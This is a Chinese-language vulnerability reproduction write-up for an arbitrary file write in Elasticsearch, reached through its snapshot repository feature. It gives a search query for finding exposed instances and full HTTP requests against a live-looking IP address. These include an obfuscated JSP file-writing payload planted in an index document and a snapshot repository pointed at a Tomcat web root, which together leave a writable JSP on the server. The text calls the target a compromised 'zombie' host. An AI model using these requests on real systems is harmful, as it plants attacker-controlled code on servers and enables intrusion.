# Elasticsearch存在任意文件写入漏洞

# 一、漏洞描述
Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。Elasticsearch存在任意文件写入漏洞

# 二、影响版本
Elasticsearch

# 三、资产测绘
```plain
app="Elasticsearch"
```

![1730009233361-9686bf63-9f51-42ac-819e-9bd09b99b929.png](./img/QnkKANvHTfXRP0Kk/1730009233361-9686bf63-9f51-42ac-819e-9bd09b99b929-807804.png)

# 三、漏洞复现
1、创建一个恶意索引文档

```plain
POST /a.jsp/a.jsp/1 HTTP/1.1
Host: 123.58.224.8:32565
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 228

{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
```

![1730010630201-6d1b0034-4b48-4e50-8a3b-631b7d52e123.png](./img/QnkKANvHTfXRP0Kk/1730010630201-6d1b0034-4b48-4e50-8a3b-631b7d52e123-859650.png)

2、再创建一个恶意的存储库，其中location的值即为要写入的路径（需要根据肉鸡的tomcat的www目录来决定）

```plain
PUT /_snapshot/a.jsp HTTP/1.1
Host: 123.58.224.8:32565
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

{
"type": "fs",
"settings": {
"location": "/usr/local/tomcat/webapps/wwwroot/",
"compress": false
}
}
```

![1730010641746-77a29c62-63cd-4336-9313-f7deca4e6370.png](./img/QnkKANvHTfXRP0Kk/1730010641746-77a29c62-63cd-4336-9313-f7deca4e6370-688334.png)

3、存储库验证并创建

```plain
PUT /_snapshot/a.jsp/a.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: settingStore=1630480512401_0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

{
     "indices": "a.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}
```

![1730010655294-9e9d90a8-fd4a-4c75-93d0-ef003dc37487.png](./img/QnkKANvHTfXRP0Kk/1730010655294-9e9d90a8-fd4a-4c75-93d0-ef003dc37487-616035.png)

4、写入jsp文件，这个jsp的文件是通过8080来访问的

```plain
/wwwroot/indices/a.jsp/snapshot-a.jsp?f=success
```

![1730010687125-d3c494d0-8f7e-4c6c-990f-b97eac530d42.png](./img/QnkKANvHTfXRP0Kk/1730010687125-d3c494d0-8f7e-4c6c-990f-b97eac530d42-084669.png)

5、在www根目录下会生成一个test.jsp的文件，并会成功被写入success

```plain
/wwwroot/test.jsp
```

![1730010705354-9724ef91-05da-4b8f-ae5d-41aae14d3c46.png](./img/QnkKANvHTfXRP0Kk/1730010705354-9724ef91-05da-4b8f-ae5d-41aae14d3c46-559091.png)



> 更新: 2024-11-27 10:04:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ktd5oh8xdfle1g4c>